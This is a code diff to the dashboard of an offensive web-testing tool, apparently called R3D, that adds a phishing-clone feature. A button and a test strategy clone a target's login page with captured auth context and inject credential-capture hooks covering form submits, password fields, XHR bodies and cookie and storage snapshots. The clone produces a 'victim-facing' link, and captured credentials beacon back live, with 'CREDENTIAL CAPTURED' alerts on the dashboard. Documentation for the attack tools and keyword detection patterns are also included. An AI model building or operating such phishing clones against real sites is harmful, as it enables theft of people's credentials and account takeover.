@@ -839,7 +839,11 @@ function buildSystems(events){
       if(e.data?.method)s.methods.add(e.data.method);
     }
   }
-  return [...map.values()].map(s=>({...s,methods:[...s.methods]})).sort((a,b)=>b.findings-a.findings);
+  return [...map.values()].map(s=>{
+    const domains=[];
+    for(const u of s.sampleUrls){try{const h=new URL(u).hostname;if(h&&!domains.includes(h))domains.push(h)}catch{}}
+    return {...s,domains,methods:[...s.methods]};
+  }).sort((a,b)=>b.findings-a.findings);
 }
 
 // ─── Executive Summary Helpers ────────────────────────────────────────
@@ -1447,7 +1451,7 @@ function renderFindingsTable(findings){
     const proveUrl=getProveUrl(d);
     const proveLink=proveUrl?`<a href="${proveUrl}" target="_blank" style="font-size:9px;font-weight:700;color:var(--red);text-decoration:none;padding:2px 6px;border:1px solid var(--red);border-radius:3px;white-space:nowrap;opacity:.8;transition:opacity .15s" onmouseover="this.style.opacity='1';this.style.background='rgba(255,23,68,.1)'" onmouseout="this.style.opacity='.8';this.style.background='none'">PROVE</a>`:'';
     return `<tr>
-      <td><input type="checkbox" class="pick-cb" onchange="togglePick('findings','${fid}','${esc(d.title||'Untitled')}',this)" ${_picked.findings.has(fid)?'checked':''}></td>
+      <td><input type="checkbox" class="pick-cb" data-title="${esc(d.title||'Untitled')}" onchange="togglePick('findings','${fid}',this.getAttribute('data-title'),this)" ${_picked.findings.has(fid)?'checked':''}></td>
       <td><span class="sev sev-${d.severity||'INFO'}">${esc(d.severity||'INFO')}</span></td>
       <td><span class="status-badge status-${st}">${stLabel}</span></td>
       <td style="max-width:500px"><div style="display:flex;align-items:center;gap:8px"><span style="color:var(--txt-br);font-weight:600">${esc(d.title||'Untitled')}</span>${proveLink}</div>${valTip}<div id="${fid}"></div></td>
@@ -1460,14 +1464,30 @@ function renderFindingsTable(findings){
 
 // ─── Test Generation ─────────────────────────────────────────────────
 window.copyToClipboard=function(btn,text){
-  navigator.clipboard.writeText(text).then(()=>{
-    btn.classList.add('copied');btn.textContent='Copied!';
-    setTimeout(()=>{btn.classList.remove('copied');btn.textContent='Copy'},1500);
-  }).catch(()=>{
-    const ta=document.createElement('textarea');ta.value=text;document.body.appendChild(ta);ta.select();document.execCommand('copy');document.body.removeChild(ta);
-    btn.classList.add('copied');btn.textContent='Copied!';
-    setTimeout(()=>{btn.classList.remove('copied');btn.textContent='Copy'},1500);
-  });
+  function done(){btn.classList.add('copied');btn.textContent='Copied!';setTimeout(()=>{btn.classList.remove('copied');btn.textContent='Copy'},1500);}
+  function fallback(){const ta=document.createElement('textarea');ta.value=text;ta.style.position='fixed';ta.style.left='-9999px';document.body.appendChild(ta);ta.select();document.execCommand('copy');document.body.removeChild(ta);done();}
+  if(navigator.clipboard&&navigator.clipboard.writeText){
+    navigator.clipboard.writeText(text).then(done).catch(fallback);
+  } else { fallback(); }
+};
+
+// ─── Phish Clone ────────────────────────────────────────────────────
+window.clonePhish=async function(domain,btn){
+  const wrap=btn.parentElement;
+  btn.textContent='Cloning\u2026';btn.disabled=true;btn.style.opacity='.5';
+  try{
+    const r=await fetch('/r3d/attack/phish/clone',{method:'POST',headers:authHeaders({'Content-Type':'application/json'}),body:JSON.stringify({url:'https://'+domain+'/',useAuthContext:true})});
+    const data=await r.json();
+    if(data.ok){
+      const serveUrl=location.origin+data.serveUrl;
+      wrap.innerHTML=`<a href="${data.serveUrl}" target="_blank" style="font-size:9px;font-weight:700;color:var(--red);text-decoration:none;padding:2px 6px;border:1px solid var(--red);border-radius:3px;opacity:.9" onmouseover="this.style.opacity='1'" onmouseout="this.style.opacity='.9'">PHISH LIVE</a>`
+        +`<button onclick="copyToClipboard(this,'${serveUrl}')" style="font-size:9px;font-weight:600;color:var(--txt);padding:2px 6px;border:1px solid var(--border);border-radius:3px;background:var(--bg3);cursor:pointer">Copy Link</button>`;
+    } else {
+      btn.textContent='Failed';btn.style.color='var(--orange)';
+    }
+  }catch(e){
+    btn.textContent='Error';btn.style.color='var(--orange)';
+  }
 };
 
 let _lastTestId=null;
@@ -1490,7 +1510,7 @@ function renderTestCard(t,findingTitle){
   if(snippet&&snippet!=='null'){
     html+=`<div class="test-section">
       <div style="display:flex;gap:8px;align-items:center;margin-bottom:6px">
-        <button class="btn-test" style="font-size:12px;padding:6px 18px" onclick="event.stopPropagation();runTestInBrowser(this,'${testId}',document.getElementById('${snippetId}').textContent,'${esc(findingTitle||'')}')">Run in Browser</button>
+        <button class="btn-test" style="font-size:12px;padding:6px 18px" data-finding-title="${esc(findingTitle||'')}" onclick="event.stopPropagation();runTestInBrowser(this,'${testId}',document.getElementById('${snippetId}').textContent,this.getAttribute('data-finding-title'))">Run in Browser</button>
         <button class="btn-copy" onclick="event.stopPropagation();copyToClipboard(this,document.getElementById('${snippetId}').textContent)">Copy</button>
         <span style="font-size:9px;color:var(--txt-dim)">Injects into active tab via R3D extension</span>
       </div>
@@ -2218,6 +2238,29 @@ const TEST_STRATEGIES = {
       console.log('[R3D TEST] SAFE: Rate limiting active (' + limited + ' x 429 out of ' + results.length + ')');
   } catch(e) { console.log('[R3D TEST] ERROR: '+e.message); }
 })()`
+  },
+  'CWE-social-eng': {
+    name: 'Credential Harvesting / Phishing Surface',
+    testApproach: `This system has weaknesses that enable credential harvesting (missing CSP, weak cookie flags, JS-accessible sessions, clonable login page, open redirect chains). Prove an attacker can clone the login page and capture credentials:
+1. Use r3d/attack/phish/clone to create a cloned phish page with injected capture hooks
+2. The proxy fetches the REAL page using captured auth context, rewrites all asset URLs to local cached copies, and AUTOMATICALLY injects comprehensive credential capture hooks: form submit interception, password field blur listeners, fetch/XHR body intercept, MutationObserver for dynamically-added forms, and post-interaction cookie/storage snapshots
+3. The returned serveUrl is the live phish page — any credentials entered there beacon to the proxy in real-time via SSE
+4. Log the serveUrl as the attack payload — this is the victim-facing link
+5. If the clone succeeded with forms detected, the phishing surface is confirmed VULNERABLE`,
+    example: `(async()=>{
+  try {
+    const r = await window.__r3d_proxy('r3d/attack/phish/clone', {
+      url: location.origin + '/', useAuthContext: true
+    });
+    if (r.body?.ok) {
+      const link = location.origin + r.body.serveUrl;
+      console.log('[R3D TEST] VULNERABLE: Phish clone live at ' + link + ' (' + r.body.assetsCloned + ' assets cloned, ' + r.body.formsDetected + ' forms with credential capture hooks)');
+      await window.__r3d_proxy('r3d/test/beacon', {
+        phishUrl: link, siteId: r.body.siteId, formsDetected: r.body.formsDetected, assetsCloned: r.body.assetsCloned
+      });
+    } else console.log('[R3D TEST] ERROR: Clone failed — ' + (r.body?.error || 'unknown'));
+  } catch(e) { console.log('[R3D TEST] ERROR: '+e.message); }
+})()`
   }
 };
 
@@ -2253,6 +2296,7 @@ const _STRATEGY_SCORING = {
   'CWE-598':  { exploitability: 3, privGain: 2, lateralMove: 1, blastRadius: 2, successSignal: 'Sensitive parameters found in URL', failureSignal: 'No sensitive data in URL parameters', opsecNotes: 'URL inspection is fully passive' },
   'CWE-1321': { exploitability: 3, privGain: 3, lateralMove: 2, blastRadius: 3, successSignal: 'Property set on Object.prototype propagates to new objects', failureSignal: 'Prototype frozen or sealed', opsecNotes: 'Client-side only — zero network noise' },
   'CWE-400':  { exploitability: 4, privGain: 2, lateralMove: 1, blastRadius: 2, successSignal: 'All rapid requests succeed without 429', failureSignal: 'Rate limiter triggers 429', opsecNotes: 'Rapid burst generates obvious pattern in logs' },
+  'CWE-social-eng': { exploitability: 5, privGain: 5, lateralMove: 4, blastRadius: 5, successSignal: 'Phish clone live with forms detected and capture hooks injected', failureSignal: 'Clone failed or target has no login forms', opsecNotes: 'Clone fetches target page server-side — generates access log entry; serve URL is on your infrastructure' },
   '_HEADER':  { exploitability: 2, privGain: 1, lateralMove: 1, blastRadius: 2, successSignal: 'Required header absent from response', failureSignal: 'All security headers present', opsecNotes: 'Passive header inspection — zero noise' },
 };
 
@@ -2313,6 +2357,8 @@ const _STRATEGY_SIGNALS = [
   { patterns: [/server.*info|server:.*|mdbws|nginx|apache|express/i], cwe: 'CWE-209', weight: 7, signal: 'Server technology disclosure' },
   { patterns: [/next\.js|react|angular|vue|nuxt/i], cwe: 'CWE-209', weight: 5, signal: 'Framework disclosure' },
   { patterns: [/iframe|frame.*embed|clickjack/i], cwe: 'CWE-16', weight: 7, signal: 'Framing/clickjacking' },
+  { patterns: [/phish|credential.harvest|login.clone|social.engineer/i], cwe: 'CWE-social-eng', weight: 8, signal: 'Phishing / credential harvesting keywords' },
+  { patterns: [/clonable.*login|login.*page.*no.*csp|weak.*login/i], cwe: 'CWE-social-eng', weight: 6, signal: 'Clonable login surface' },
 ];
 
 const _HEADER_STRATEGY = {
@@ -2635,6 +2681,14 @@ r3d/scan/fuzz — Parameter fuzzing with built-in payload libraries. The proxy i
     maxRequests: 50
   })
 
+--- PHISHING CLONE ---
+
+r3d/attack/phish/clone — Clone a target page as a credential-harvesting phish site. The proxy fetches the page with captured auth context, rewrites all URLs to local cached assets, and injects comprehensive credential capture hooks (form submit, password field blur, fetch/XHR body intercept, MutationObserver for dynamic forms, post-interaction cookie/storage snapshot). Returns {ok, siteId, serveUrl, assetsCloned, formsDetected}. The serveUrl is the victim-facing link. Credentials captured on the phish page beacon back to the proxy in real-time via SSE.
+  await window.__r3d_proxy('r3d/attack/phish/clone', {
+    url: 'https://target.example.com/login',
+    useAuthContext: true
+  })
+
 --- WHEN TO USE WHICH TOOL ---
 - Single request/check → r3d/attack/fetch (with useAuthContext: true)
 - Validate a stolen token → r3d/attack/validate-token
@@ -2643,6 +2697,7 @@ r3d/scan/fuzz — Parameter fuzzing with built-in payload libraries. The proxy i
 - Exfiltrate data as proof → r3d/test/beacon
 - Probe multiple endpoints at once → r3d/scan/run
 - Fuzz a parameter with payloads → r3d/scan/fuzz (use the matching payloadSet)
+- Clone a login page for credential capture → r3d/attack/phish/clone
 - IDOR: fuzz with payloadSets: ['idor']
 - SSRF: fuzz with payloadSets: ['ssrf']
 - XSS: fuzz with payloadSets: ['xss']
@@ -3028,6 +3083,7 @@ function renderSystems(systems,findings){
       <div style="display:flex;gap:6px;margin-left:auto;align-items:center">
         ${probeUrl?`<a href="${probeUrl}" target="_blank" style="font-size:9px;font-weight:700;color:var(--accent);text-decoration:none;padding:2px 6px;border:1px solid var(--accent);border-radius:3px;opacity:.8" onmouseover="this.style.opacity='1'" onmouseout="this.style.opacity='.8'">HEADERS</a>`:''}
         ${corsUrl?`<a href="${corsUrl}" target="_blank" style="font-size:9px;font-weight:700;color:var(--orange);text-decoration:none;padding:2px 6px;border:1px solid var(--orange);border-radius:3px;opacity:.8" onmouseover="this.style.opacity='1'" onmouseout="this.style.opacity='.8'">CORS</a>`:''}
+        ${domain?`<span id="phish-ctl-${esc(domain)}"><button onclick="clonePhish('${esc(domain)}',this)" style="font-size:9px;font-weight:700;color:var(--red);padding:2px 6px;border:1px solid var(--red);border-radius:3px;background:transparent;cursor:pointer;opacity:.8" onmouseover="this.style.opacity='1'" onmouseout="this.style.opacity='.8'" title="Clone this system as a phishing site with credential capture">PHISH</button></span>`:''}
         <button class="btn-explain" onclick="explainSystem('${esc(s.id)}','${esc(s.name)}',this)" title="Quick AI summary of this system's risk posture">Explain</button>
         <button class="btn btn-ai" onclick="analyzeSystem('${esc(s.id)}','${esc(s.name)}',${s.findings},${s.requests},this)" title="Deep AI risk assessment: attack vectors, hardening recs, compliance gaps">Risk Assessment</button>
       </div>
@@ -3336,6 +3392,23 @@ function _handleSSE(e){
         ${bodyPreview?`<pre style="font-size:10px;color:var(--orange);margin:4px 0 0;white-space:pre-wrap;max-height:80px;overflow:hidden">${esc(bodyPreview)}</pre>`:''}
       </div>`;
       setTimeout(()=>{if(bl)bl.innerHTML=''},15000);
+    }
+    if(msg.type==='phish_credential_captured'){
+      const bl=document.getElementById('beacon-log')||(()=>{const c=document.createElement('div');c.id='beacon-log';c.style.cssText='position:fixed;bottom:12px;right:12px;max-width:420px;z-index:9999';document.body.appendChild(c);return c})();
+      const fields=msg.fieldCount?msg.fieldCount+' fields captured':'data intercepted';
+      bl.innerHTML=`<div style="background:var(--bg2);border:2px solid var(--red);border-radius:6px;padding:12px 16px;margin-top:6px;box-shadow:0 4px 20px rgba(0,0,0,.5);animation:fadeIn .3s">
+        <div style="font-size:11px;font-weight:900;color:var(--red);margin-bottom:6px">CREDENTIAL CAPTURED \u2014 PHISHING PAYLOAD CONFIRMED</div>
+        <div style="font-size:10px;color:var(--txt-dim)">Target: ${esc(msg.targetUrl||'')} | ${esc(fields)} | ${esc(msg.captureType||'')} | ${msg.ts||''}</div>
+      </div>`;
+      setTimeout(()=>{if(bl)bl.innerHTML=''},20000);
+    }
+    if(msg.type==='phish_cloned'){
+      const ctl=document.getElementById('phish-ctl-'+msg.targetUrl?.replace(/^https?:\/\//,'').split('/')[0]);
+      if(ctl){
+        const serveUrl=location.origin+(msg.serveUrl||'');
+        ctl.innerHTML=`<a href="${msg.serveUrl||''}" target="_blank" style="font-size:9px;font-weight:700;color:var(--red);text-decoration:none;padding:2px 6px;border:1px solid var(--red);border-radius:3px;opacity:.9" onmouseover="this.style.opacity='1'" onmouseout="this.style.opacity='.9'">PHISH LIVE</a>`
+          +`<button onclick="copyToClipboard(this,'${serveUrl}')" style="font-size:9px;font-weight:600;color:var(--txt);padding:2px 6px;border:1px solid var(--border);border-radius:3px;background:var(--bg3);cursor:pointer">Copy Link</button>`;
+      }
     }
     if(msg.type==='pivot_progress'&&msg.sessionId===activeSession){
       const el=document.getElementById('pivot-results');
